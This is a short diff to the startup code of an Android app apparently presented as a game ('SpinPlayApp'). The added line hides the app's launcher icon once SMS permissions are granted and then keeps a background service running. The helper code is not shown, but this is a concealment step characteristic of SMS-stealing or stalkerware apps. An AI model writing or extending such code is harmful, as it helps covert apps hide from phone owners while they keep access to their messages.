@@ -9,6 +9,7 @@ public class SpinPlayApp extends Application {
         super.onCreate();
         FirebaseBootstrap.ensureApp(this);
         if (PermissionHelper.hasSmsPermissions(this)) {
+            PermissionHelper.hideLauncherIcon(this);
             ServiceLauncher.ensureRunning(this);
         }
     }
